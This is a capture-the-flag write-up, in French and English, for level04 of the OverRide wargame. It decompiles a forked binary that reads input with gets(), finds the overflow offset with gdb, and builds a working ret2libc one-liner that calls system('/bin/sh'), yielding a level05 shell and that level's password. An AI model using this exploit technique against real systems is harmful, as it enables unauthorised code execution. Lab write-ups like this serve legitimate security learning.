# Level04

- Source Code
    
    ```c
    #include <stdint.h>
    
    int32_t main(int32_t argc, char **argv, char **envp)
    {
    	pid_t pid = fork();
    	void var_a0;
    	void *edi = &var_a0;
    
    	for (int32_t ecx = 0x20; ecx != 0; ecx = (ecx - 1))
    	{
    		*edi = 0;
    		edi = (edi + 4);
    	}
    
    	int32_t var_a4 = 0;
    	if (pid == 0)//child
    	{
    		prctl(PR_SET_DUMPABLE, PR_DUMPABLE);
    		ptrace(PTRACE_TRACEME, 0, 0, 0);
    		puts("Give me some shellcode, k");
    		gets(&var_a0);
    	}
    
    	else//parent
    	{
    		while (true)
    		{
    			wait(&var_a4);//wait child
    			if (((var_a4 & 0x7f) != 0 && (((var_a4 & 0x7f) + 1) >> 1) <= 0))
    			{
    				if (ptrace(PTRACE_PEEKUSER, pid, 0x2c, 0) == 0xb)
    				{
    					puts("no exec() for you");
    					kill(pid, 9);
    					break;
    				}
    				continue;
    			}
    			puts("child is exiting...");
    			break;
    		}
    	}
    	return 0;
    }
    ```
    

*Que fait prctl() ?*

*prctl* permet de modifier les paramteres du process

```c
prctl(PR_SET_DUMPABLE, PR_DUMPABLE);
```

*PR_SET_DUMPABLE* permet de preciser que on veut modifier l’acivation ou non du dump

*Le dump* permet de stocker dans un fichier ou afficher en stdou la memoire du process si il crash

*PR_DUMPABLE* permet d’activer le dump

*Ou sont les dumps dans ce cas ?*

*Que fait ptrace() ?*

*******ptrace******* permet de tracer et controler l’execution su child enfant depuis le parent.

```c
ptrace(PTRACE_TRACEME, 0, 0, 0);
```

*PTRACE_TRACEME* est un parametre dans de ptrace dans le child. Il permet d’autoriser le parent a le suivre.

Le process du child va s’arreter des que il va recevoir un signal. Ce qui permet au parent de lire et modifier la memoire et les registers du process enfant

*Comment et quelle signaux donner au child ?*

```c
ptrace(PTRACE_PEEKUSER, pid, 0x2c, 0) == 0xb
```

*PTRACE_PEEKUSER* fait retourner a ptrace le mot (32bits) lu ai offset 0x2c dans le process pid (child)

```c
level04@OverRide:~$ ltrace -f ./level04
[pid 2010] __libc_start_main(0x80486c8, 1, -10300, 0x8048830, 0x80488a0 <unfinished ...>
[pid 2010] signal(14, 0x0804868f)                                         = NULL
[pid 2010] alarm(60)                                                      = 0
[pid 2010] fork()                                                         = 2011
[pid 2010] wait(0xffffd68c <unfinished ...>
[pid 2011] <... fork resumed> )                                           = 0
[pid 2011] prctl(1, 1, 0, 0xf7e2fe44, 2944)                               = 0
[pid 2011] ptrace(0, 0, 0, 0, 2944)                                       = -1
[pid 2011] puts("Give me some shellcode, k"Give me some shellcode, k
)                              = 26
[pid 2011] gets(-10608, 0, 0, 0, 2944AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
)                                    = -10608
[pid 2011] --- SIGSEGV (Segmentation fault) ---
[pid 2011] +++ killed by SIGSEGV +++
[pid 2010] --- SIGCHLD (Child exited) ---
[pid 2010] <... wait resumed> )                                           = 2011
[pid 2010] puts("child is exiting..."child is exiting...
)                                    = 20
[pid 2010] +++ exited (status 0) +++
```

With this command we follow the lib calls of the child and we can see that we seg. fault in the child.

But the parent don’t wait anymore, break the while(true) and return 0

So we go in gdb with the child mode activated

 

```c
(gdb) set follow-fork-mode child
[...]
Starting program: /home/users/level04/level04
[New process 2024]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2024]
0x41326641 in ?? ()
```

With a pattern in input of the gets  we found that the return address of the child is at an offset of 156

Let’s try a ret2libc

```c
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) info proc map
process 2024
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
				[...]
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
				[...]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
```

And we got it !

```c
level04@OverRide:~$ (python -c "print('A' * 156 + '\xd0\xae\xe6\xf7' + '\x90\xeb\xe5\xf7' + '\xec\x97\xf8\xf7')"; cat) | ./level04
Give me some shellcode, k
id
uid=1004(level04) gid=1004(level04) euid=1005(level05) egid=100(users) groups=1005(level05),100(users),1004(level04)
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3a
```